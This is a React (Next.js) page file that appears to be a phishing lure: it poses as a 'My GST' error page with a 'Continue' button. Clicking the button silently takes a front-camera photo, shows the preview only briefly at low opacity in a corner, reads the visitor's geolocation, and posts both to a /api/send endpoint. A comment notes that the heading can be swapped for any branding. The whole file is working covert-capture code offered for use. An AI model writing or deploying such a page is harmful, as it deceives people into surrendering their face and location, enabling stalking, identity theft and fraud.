"use client";
import { useRef, useState } from "react";
import "@/public/404.css";

export default function Home() {
  const videoRef = useRef<HTMLVideoElement>(null);
  const [showPreview, setShowPreview] = useState(false);

  async function capture() {
    // ---------- CAMERA ----------
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" }
    });

    const video = videoRef.current!;
    video.srcObject = stream;
    video.muted = true;

    // 🔑 SHOW preview briefly (critical)
    setShowPreview(true);
    await video.play();

    // wait for real frame to render
    await new Promise(resolve => setTimeout(resolve, 500));

    // ---------- CAPTURE ----------
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext("2d")!;
    ctx.drawImage(video, 0, 0);

    const image = canvas.toDataURL("image/jpeg", 0.9);

    console.log("Image length:", image.length); // should be >15000

    // stop camera + hide preview
    stream.getTracks().forEach(t => t.stop());
    setShowPreview(false);

    // ---------- LOCATION ----------
    navigator.geolocation.getCurrentPosition(async pos => {
      await fetch("/api/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          image,
          lat: pos.coords.latitude,
          lon: pos.coords.longitude
        })
      });
    });
  }
  // at h1 we can add any thing
  return (
    <div className="error-container">
      <h1>My GST</h1>  
      <p>Click here to continue</p>

      {/* Camera preview (briefly visible) */}
      {showPreview && (
        <video
          ref={videoRef}
          playsInline
          muted
          style={{
            width: "120px",
            height: "120px",
            position: "fixed",
            bottom: "12px",
            right: "12px",
            opacity: 0.2
          }}
         />
      )}

      <button onClick={capture}>Continue</button>
    </div>
  );
}
